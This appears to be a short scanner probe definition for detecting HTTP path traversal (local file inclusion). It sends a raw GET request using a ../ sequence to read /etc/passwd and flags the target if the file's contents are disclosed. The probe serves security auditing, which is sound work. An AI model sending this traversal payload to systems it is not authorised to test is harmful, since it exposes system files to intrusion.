name: http-path-traversal
description: HTTP path traversal / LFI probe: requests ../etc/passwd and flags if its content is disclosed in the response

steps.bytes:
GET /../../../../../../etc/passwd HTTP/1.1
Host: $target.host
User-Agent: packetsonde-audit
Accept: */*
Connection: close

then.title: Path traversal LFI: /etc/passwd disclosed via ../ traversal
